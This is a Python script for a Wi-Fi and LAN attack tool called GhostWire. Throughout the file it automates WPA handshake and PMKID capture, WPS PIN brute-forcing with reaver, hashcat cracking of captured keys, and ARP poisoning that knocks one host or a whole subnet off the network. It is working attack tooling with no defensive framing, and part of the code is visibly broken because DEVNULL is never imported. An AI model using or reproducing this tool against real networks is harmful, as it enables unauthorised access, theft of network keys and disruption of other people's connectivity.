#!/usr/bin/env python3
"""
GhostWire – Tactical Wifi Penetration 
Author  : Null_Lyfe
License : MIT
"""

from __future__ import annotations
import argparse, csv, ipaddress, json, logging, os, random, shutil, signal, sys, time
from datetime import datetime
from pathlib import Path
from subprocess import Popen, PIPE, STDOUT, CalledProcessError
from threading import Thread
from typing import Iterable, Sequence, Tuple, Optional

# ── lightweight stubs for CI / unit-tests ───────────────────────────────
TEST_MODE = os.getenv("GW_TEST_STUB") == "1"
if TEST_MODE:                                 # monkey-patch dummy Rich & Scapy
    import types, builtins
    for m in ("rich", "rich.console", "rich.table", "rich.panel",
              "rich.progress", "scapy", "scapy.all"):
        sys.modules[m] = types.ModuleType(m)

from rich import print as rprint                        # type: ignore
from rich.console import Console                        # type: ignore
from rich.panel import Panel                            # type: ignore
from rich.table import Table                            # type: ignore
from rich.progress import (                             # type: ignore
    Progress, SpinnerColumn, TextColumn,
    BarColumn, TimeElapsedColumn,
)
from scapy.all import ARP, Ether, srp, send, get_if_hwaddr  # type: ignore

console = Console()

NEON_GREEN = "[bright_green]"
NEON_RED   = "[bold red]"
_QUOTES = [
    "Obscurity isn’t security; vigilance is.",
    "The quieter you become, the more you hear.",
    "Amateurs hack systems; pros hack people.",
]

# ── paths & logging ─────────────────────────────────────────────────────
LOG_DIR  = Path.home() / ".ghostwire"
LOG_DIR.mkdir(exist_ok=True)
KEY_CSV  = LOG_DIR / "cracked_keys.csv"
logging.basicConfig(filename=LOG_DIR / "ghostwire.log",
                    level=logging.INFO,
                    format="%(asctime)s %(levelname)s: %(message)s")

# ── globals for cleanup ─────────────────────────────────────────────────
ACTIVE_MON: set[str]                 = set()        # monitor interfaces
POISON_PAIRS: set[Tuple[str,str,str]] = set()       # (victim, gateway, iface)

# ── subprocess helpers ─────────────────────────────────────────────────
def run_cmd(cmd: Sequence[str], *, capture: bool=False) -> str | None:
    logging.info("RUN %s", " ".join(cmd))
    try:
        proc = Popen(cmd, stdout=PIPE if capture else DEVNULL,
                     stderr=PIPE if capture else DEVNULL, text=True)
        out, err = proc.communicate()
    except FileNotFoundError:
        sys.exit(f"{NEON_RED}✘ {cmd[0]} not found[/]")
    if proc.returncode:
        rprint(f"{NEON_RED}✘ Failed: {' '.join(cmd)}[/]")
        if err:
            logging.error(err.strip())
        sys.exit(1)
    return out if capture else None

def run_with_progress(cmd: Sequence[str], desc: str, total: int|None=None) -> None:
    """Stream cmd through Rich progress bar; parse '%'-lines if total set."""
    with Progress(SpinnerColumn(style="purple"),
                  TextColumn("[progress.description]{task.description}"),
                  BarColumn(bar_width=None) if total else None,
                  TextColumn("{task.percentage:>3.0f}%") if total else None,
                  TimeElapsedColumn()) as prog:
        tid = prog.add_task(desc, total=total or 1)
        try:
            proc = Popen(cmd, stdout=PIPE, stderr=STDOUT,
                         text=True, bufsize=1)
        except FileNotFoundError:
            sys.exit(f"{NEON_RED}✘ {cmd[0]} not found[/]")
        for line in proc.stdout:                                      # type: ignore
            if total and "%" in line:
                try:
                    pct = float(line.split("%")[0].split()[-1])
                    prog.update(tid, completed=pct)
                except ValueError:
                    pass
        proc.wait()
        if proc.returncode:
            raise CalledProcessError(proc.returncode, cmd)
        prog.update(tid, completed=total or 1)

# ── privilege / deps / iface detect ────────────────────────────────────
def require_root() -> None:
    if os.geteuid() != 0:
        sys.exit(f"{NEON_RED}✘ Root privileges required.[/]")

def check_deps(bins: Iterable[str]) -> None:
    miss = [b for b in bins if shutil.which(b) is None]
    if miss:
        sys.exit(f"{NEON_RED}✘ Missing tools:[/] " + ", ".join(miss))

def detect_wifi_iface() -> str:
    for dev in Path("/sys/class/net").iterdir():
        if (dev / "wireless").exists():
            return dev.name
    out = run_cmd(["iw", "dev"], capture=True) or ""
    for ln in out.splitlines():
        if "Interface" in ln:
            return ln.split()[-1]
    sys.exit(f"{NEON_RED}✘ No wireless interface detected.[/]")

# ── monitor helpers ────────────────────────────────────────────────────
def enable_monitor(iface: str) -> str:
    run_cmd(["airmon-ng", "start", iface])
    return iface + "mon" if not iface.endswith("mon") else iface

def disable_monitor(iface: str) -> None:
    if iface.endswith("mon"):
        run_cmd(["airmon-ng", "stop", iface])

def start_monitor(iface: str|None) -> str:
    iface = iface or detect_wifi_iface()
    mon   = enable_monitor(iface)
    ACTIVE_MON.add(mon)
    rprint(f"{NEON_GREEN}✔ Monitor mode enabled → {mon}[/]")
    return mon

def stop_monitor(iface: str|None) -> None:
    if iface:
        target = iface
    elif ACTIVE_MON:
        target = next(iter(ACTIVE_MON))
    else:
        target = detect_wifi_iface() + "mon"
    disable_monitor(target)
    ACTIVE_MON.discard(target)
    rprint("[cyan]↩ Monitor mode stopped.[/]")

# ── cracked-key helpers ────────────────────────────────────────────────
def _save_keys_csv(rows: list[Tuple[str,str]]) -> None:
    new = not KEY_CSV.exists()
    with KEY_CSV.open("a", newline="") as f:
        wr = csv.writer(f)
        if new:
            wr.writerow(("timestamp", "target", "key"))
        ts = datetime.now().isoformat(timespec="seconds")
        for t, k in rows:
            wr.writerow((ts, t, k))

def show_keys(rows: list[Tuple[str,str]]) -> None:
    if not rows:
        rprint(f"{NEON_RED}✘ No keys cracked.[/]")
        return
    _save_keys_csv(rows)
    tbl = Table(title="Cracked Keys", header_style="bright_magenta")
    tbl.add_column("Target")
    tbl.add_column("Key / PIN", style="bright_green")
    for t, k in rows:
        tbl.add_row(t, k)
    console.print(tbl)

# ── Wi-Fi operations (scan/handshake/pmkid/wps) ────────────────────────
def wifi_scan(iface: str) -> None:
    run_cmd(["airodump-ng", iface])

def capture_handshake(iface: str, bssid: str, channel: str, wordlist: str|None=None):
    run_with_progress(["airodump-ng", "-c", channel, "--bssid", bssid,
                       "-w", "handshake", iface], "Capturing handshake")
    if wordlist:
        auto_crack("handshake-01.cap", wordlist)

def pmkid_capture(iface: str, wordlist: str|None=None):
    run_with_progress(["hcxdumptool", "-i", iface, "-o", "pmkid.pcapng"],
                      "Capturing PMKID")
    if wordlist:
        auto_crack("pmkid.pcapng", wordlist)

def wps_attack(iface: str, bssid: str, channel: str):
    out = run_cmd(["reaver", "-i", iface, "-b", bssid, "-c", channel, "-vv"],
                  capture=True)
    pin = psk = None
    for ln in out.splitlines():
        if "WPS PIN:" in ln: pin = ln.split(":")[-1].strip()
        if "PSK:"    in ln: psk = ln.split(":")[-1].strip()
    (LOG_DIR / "wps_creds.json").write_text(json.dumps(
        {"bssid": bssid, "pin": pin, "psk": psk}, indent=2))
    show_keys([(bssid, psk or pin or "?")])

# ── hashcat helpers ────────────────────────────────────────────────────
def _to_22000(capture: str) -> Path:
    out = Path(capture).with_suffix(".22000")
    run_cmd(["hcxpcapngtool", "-o", out, capture])
    return out

def auto_crack(capture: str, wordlist: str) -> None:
    h22000 = _to_22000(capture)
    run_with_progress(["hashcat", "--status", "--status-json",
                       "-m", "22000", "-a", "0",
                       h22000, wordlist, "--force"],
                      "Hashcat crack", total=100)
    show = run_cmd(["hashcat", "--show", "-m", "22000", h22000], capture=True) or ""
    rows: list[Tuple[str,str]] = []
    for ln in show.splitlines():
        parts = ln.split("*")
        if len(parts) >= 3:
            rows.append((parts[1], parts[-1]))
    show_keys(rows)

# ── LAN actions (scan / kick / kickall) ────────────────────────────────
def lan_scan(subnet: str) -> None:
    net = ipaddress.ip_network(subnet, strict=False)
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=str(net))
    ans, _ = srp(pkt, timeout=2, retry=1, verbose=False)
    tbl = Table(show_header=True, header_style="bright_magenta")
    tbl.add_column("IP", style="cyan"); tbl.add_column("MAC")
    for _, r in ans: tbl.add_row(r.psrc, r.hwsrc)
    console.print(tbl)

def _restore_arp(victim: str, gateway: str, iface: str):
    send(ARP(op=2, pdst=victim, psrc=gateway), count=5,
         iface=iface, verbose=False)
    send(ARP(op=2, pdst=gateway, psrc=victim), count=5,
         iface=iface, verbose=False)

def _poison(victim: str, gateway: str, iface: str):
    vict_hw = get_if_hwaddr(iface)
    pkt1 = ARP(op=2, pdst=victim,  psrc=gateway, hwsrc=vict_hw)
    pkt2 = ARP(op=2, pdst=gateway, psrc=victim, hwsrc=vict_hw)
    try:
        while True:
            send(pkt1, iface=iface, verbose=False)
            send(pkt2, iface=iface, verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        _restore_arp(victim, gateway, iface)
        raise

def kick(victim: str, gateway: str, iface: str):
    POISON_PAIRS.add((victim, gateway, iface))
    _poison(victim, gateway, iface)

def kickall(subnet: str, gateway: str, iface: str):
    for ip in ipaddress.ip_network(subnet, strict=False).hosts():
        POISON_PAIRS.add((str(ip), gateway, iface))
        Thread(target=_poison,
               args=(str(ip), gateway, iface), daemon=True).start()
    rprint("[purple]✜ ARP flood running – Ctrl-C to stop[/]")
    signal.pause()

# ── cleanup – runs on SIGINT & at exit ─────────────────────────────────
def _cleanup(_: Optional[int]=None, __=None):
    for mon in list(ACTIVE_MON):
        disable_monitor(mon)
    for v, g, i in list(POISON_PAIRS):
        _restore_arp(v, g, i)
    ACTIVE_MON.clear(); POISON_PAIRS.clear()
    if _ is not None:
        console.print("\n[cyan]↩ Cleanup complete. Exiting.[/]")
        sys.exit(0)

signal.signal(signal.SIGINT, _cleanup)
import atexit; atexit.register(_cleanup)

# ── UI helpers ─────────────────────────────────────────────────────────
def _banner() -> None:
    console.print(Panel("[b bright_magenta]GHOSTWIRE[/]",
                        subtitle=f"[bright_cyan]{random.choice(_QUOTES)}[/]",
                        border_style="cyan", padding=(1,6)))

def _menu() -> None:
    g = Table.grid(padding=(0,2))
    g.add_row("1) Wi-Fi Scan",        "5) Crack capture")
    g.add_row("2) LAN Scan",          "6) Start monitor")
    g.add_row("3) Kick victim",       "7) Stop monitor")
    g.add_row("4) Kick ALL",          "0) Quit")
    console.print(Panel(g, title="[bright_magenta]Main Menu[/]",
                        border_style="bright_magenta"))

def interactive():
    while True:
        _menu()
        ch = console.input("[bright_green]› [/]").strip()
        if ch == "1":
            mon = start_monitor(console.input("Interface (blank=auto) > ").strip() or None)
            try: wifi_scan(mon)
            finally: stop_monitor(mon)
        elif ch == "2":
            lan_scan(console.input("Subnet (e.g. 192.168.1.0/24) > "))
        elif ch == "3":
            kick(console.input("Victim IP > "),
                 console.input("Gateway IP > "),
                 console.input("Interface (blank=auto) > ").strip() or detect_wifi_iface())
        elif ch == "4":
            kickall(console.input("Subnet > "),
                    console.input("Gateway IP > "),
                    console.input("Interface (blank=auto) > ").strip() or detect_wifi_iface())
        elif ch == "5":
            auto_crack(console.input("Capture file > "),
                       console.input("Wordlist path > "))
        elif ch == "6":
            start_monitor(console.input("Interface (blank=auto) > ").strip() or None)
        elif ch == "7":
            stop_monitor(console.input("Interface (blank=auto) > ").strip() or None)
        elif ch == "0":
            _cleanup(); sys.exit(0)

# ── CLI parsing ────────────────────────────────────────────────────────
def _cli() -> argparse.ArgumentParser:
    p   = argparse.ArgumentParser(prog="ghostwire", add_help=False)
    sub = p.add_subparsers(dest="cmd")

    wifi = sub.add_parser("wifi"); wifi.add_argument("action", choices=["scan","handshake","pmkid","wps"])
    wifi.add_argument("-i","--iface"); wifi.add_argument("--bssid"); wifi.add_argument("--channel"); wifi.add_argument("--wordlist")

    lan  = sub.add_parser("lan");  lan.add_argument("action", choices=["scan","kick","kickall"])
    lan.add_argument("subnet_or_ip"); lan.add_argument("--gateway"); lan.add_argument("-i","--iface")

    crack = sub.add_parser("crack"); crack.add_argument("capture"); crack.add_argument("wordlist")

    mon = sub.add_parser("monitor"); mon.add_argument("action", choices=["start","stop"]); mon.add_argument("-i","--iface")
    return p

# ── main entry ─────────────────────────────────────────────────────────
def main() -> None:
    require_root(); _banner()
    check_deps(["airmon-ng","airodump-ng","hcxdumptool","hcxpcapngtool",
                "hashcat","reaver","nmap","iw"])
    args = _cli().parse_args()
    if args.cmd is None:
        interactive(); return

    if args.cmd == "wifi":
        mon = start_monitor(args.iface)
        try:
            if args.action == "scan": wifi_scan(mon)
            elif args.action == "handshake":
                if not (args.bssid and args.channel):
                    sys.exit("handshake needs --bssid & --channel")
                capture_handshake(mon, args.bssid, args.channel, args.wordlist)
            elif args.action == "pmkid":
                pmkid_capture(mon, args.wordlist)
            elif args.action == "wps":
                if not (args.bssid and args.channel):
                    sys.exit("wps needs --bssid & --channel")
                wps_attack(mon, args.bssid, args.channel)
        finally:
            stop_monitor(mon)

    elif args.cmd == "lan":
        iface = args.iface or detect_wifi_iface()
        if args.action == "scan":
            lan_scan(args.subnet_or_ip)
        elif args.action == "kick":
            if not args.gateway: sys.exit("kick needs --gateway")
            kick(args.subnet_or_ip, args.gateway, iface)
        elif args.action == "kickall":
            if not args.gateway: sys.exit("kickall needs --gateway")
            kickall(args.subnet_or_ip, args.gateway, iface)

    elif args.cmd == "crack":
        auto_crack(args.capture, args.wordlist)

    elif args.cmd == "monitor":
        if args.action == "start": start_monitor(args.iface)
        else:                      stop_monitor(args.iface)

if __name__ == "__main__":
    main()